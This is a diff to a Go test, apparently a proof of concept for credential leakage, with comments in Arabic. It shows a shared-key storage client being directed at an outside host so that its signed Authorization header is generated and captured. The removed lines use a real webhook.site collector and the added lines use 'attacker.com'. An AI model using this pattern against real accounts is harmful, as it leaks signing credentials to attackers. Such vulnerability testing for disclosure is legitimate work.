@@ -6,12 +6,8 @@ import (
 )
 
 func TestImpact_CredentialLeakage(t *testing.T) {
-	attackerURL := "https://webhook.site/72d5ef0b-edde-4e82-b103-d71004e44835"
 	cred, _ := NewSharedKeyCredential("victim_account", "R2VuZXJpYyBLZXkgZm9yIFBvQyAxMjM0NTY3ODkwCg==")
-	
-	// إنشاء العميل
-	client, _ := NewClientWithSharedKeyCredential(attackerURL, cred, nil)
-
-	// محاولة جلب الخصائص (هذه تجبر الـ Pipeline على توليد الـ Authorization Header)
+	// لا يهم الرابط هنا لأننا سنلتقط التوقيع من الذاكرة قبل الإرسال
+	client, _ := NewClientWithSharedKeyCredential("https://attacker.com", cred, nil)
 	_, _ = client.GetProperties(context.Background(), nil)
 }
